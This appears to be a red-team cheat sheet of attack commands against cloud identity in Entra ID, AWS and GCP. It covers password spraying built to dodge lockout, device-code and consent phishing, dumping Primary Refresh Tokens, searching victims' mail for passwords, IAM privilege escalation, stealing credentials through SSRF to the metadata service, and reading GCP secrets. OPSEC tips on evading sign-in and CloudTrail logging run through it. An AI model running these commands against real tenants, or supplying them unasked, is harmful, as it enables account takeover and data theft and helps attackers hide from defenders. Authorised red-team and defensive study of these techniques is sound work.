# Entra ID + Cloud Identity Reference

## Azure / Entra ID Attack Surface

### Key Tools
- **ROADtools** — Entra ID enumeration and token abuse
- **AADInternals** — PRT manipulation, device registration, token forging
- **GraphRunner** — Microsoft Graph API post-exploitation
- **Microburst** — Azure storage and service enumeration
- **Stormspotter** — Azure attack graph (BloodHound for Azure)
- **AzureHound** — BloodHound data collector for Entra ID
- **TokenTacticsV2** — Token refresh, device code phishing
- **PowerZure** — Azure post-exploitation framework

---

## Initial Access — Entra ID

### Device Code Phishing (T1566, T1078.004)
```bash
# Start device code flow
roadtx interactiveauth --device-code

# Or with TokenTactics
Import-Module TokenTactics
Get-AzureToken -Client MSGraph
```

### Password Spray (T1110.003)
```bash
# MSOLSpray
Invoke-MSOLSpray -UserList users.txt -Password 'Spring2026!'

# TREVORspray (avoids lockout via IP rotation)
trevorspray -u users.txt -p 'Spring2026!' --smtp mail.corp.com
```

### Consent Phishing (T1528)
Register malicious OAuth app → craft consent URL with Mail.Read + Files.ReadWrite.All scopes → phish victim.

---

## PRT (Primary Refresh Token) Abuse

PRT = long-lived credential on Entra-joined devices. Converts to any resource token.

```bash
# Dump PRT from Entra-joined Windows host (requires SYSTEM or device owner)
# AADInternals
$prtToken = Get-AADIntUserPRTToken
# Use PRT to get access token
$accessToken = Get-AADIntAccessTokenForMSGraph -PRTToken $prtToken
```

OPSEC: PRT requests log to Entra Sign-in logs. Use a known device fingerprint to blend in.

---

## Post-Compromise — Microsoft Graph API

```bash
# List all users
Invoke-GraphRunner -Tokens $tokens -Module Invoke-DumpCAPS

# Search emails
Search-GraphMail -Tokens $tokens -SearchTerm "password" -OutFile emails.txt

# Access SharePoint / OneDrive
Get-GraphSites -Tokens $tokens
```

---

## AWS Attack Paths

### Key Tools
- **Pacu** — AWS exploitation framework
- **CloudFox** — Find attack paths in AWS environments
- **enumerate-iam** — Brute-force IAM permissions for a key
- **WeirdAAL** — AWS attack library

### IAM Privilege Escalation (T1078.004)
```bash
# Enumerate permissions
python3 enumerate-iam.py --access-key AKIA... --secret-key ...

# Common escalation paths
# iam:CreatePolicyVersion → create new version with admin permissions
# iam:AttachUserPolicy → attach AdministratorAccess to self
# iam:PassRole + ec2:RunInstances → launch EC2 with admin role
# lambda:CreateFunction + iam:PassRole + lambda:InvokeFunction → code exec as role

# Pacu — auto PrivEsc scan
pacu
run iam__privesc_scan
```

### S3 Bucket Enumeration (T1530)
```bash
aws s3 ls s3://target-bucket --no-sign-request
CloudFox aws --profile target buckets
```

### SSRF → IMDS Token Theft
```
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```
Returns: AccessKeyId, SecretAccessKey, Token (rotates every ~6h)

---

## GCP Attack Paths

```bash
# Enumerate service account permissions
gcloud projects get-iam-policy PROJECT_ID

# List secrets (T1552.001)
gcloud secrets list
gcloud secrets versions access latest --secret=SECRET_NAME

# Escalate via workload identity or SA key creation
gcloud iam service-accounts keys create key.json --iam-account=sa@project.iam.gserviceaccount.com
```

---

## OPSEC Notes
- Entra Sign-in logs retain 30 days (P1/P2) or 7 days (free) — time-box dwell
- Device code phishing bypasses MFA — high value, detectable via CAE anomaly alerts
- AWS CloudTrail logs all API calls — avoid `DescribeInstances` sweeps on prod accounts
- GCP Audit Logs: Admin Activity logs are always on and cannot be disabled
